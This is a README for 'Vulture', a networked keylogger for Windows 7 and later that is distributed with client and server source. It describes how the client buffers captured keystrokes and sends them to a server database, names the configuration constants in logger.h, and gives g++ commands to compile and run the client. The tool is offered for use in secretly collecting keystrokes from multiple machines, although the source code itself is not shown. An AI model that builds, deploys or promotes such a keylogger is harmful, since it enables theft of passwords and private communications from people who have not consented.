
# Vulture
Vulture is a networked keylogger created for Windows 7+. Vulture comes with source code for the server and client side. This source allows you to log multiple clients keystrokes and store them in a server database. 

### Client Side
The Vulture client stores keystrokes in a temporary memory space with a defined limit. Once the memory limit is hit, the client will send the keystrokes to the server. The memory limit is defined in a constant called **BUFFER_KEYLOG_SIZE** in the ```logger.h``` source file. To see the print/debug statements, set the **DEBUG** constant in ```logger.h``` to 1 (for true). 

#### Compile the Client Side
``` 
g++ main.cpp logger.cpp client.cpp -lWs2_32 -o vultureClient
./vultureClient.exe 
```
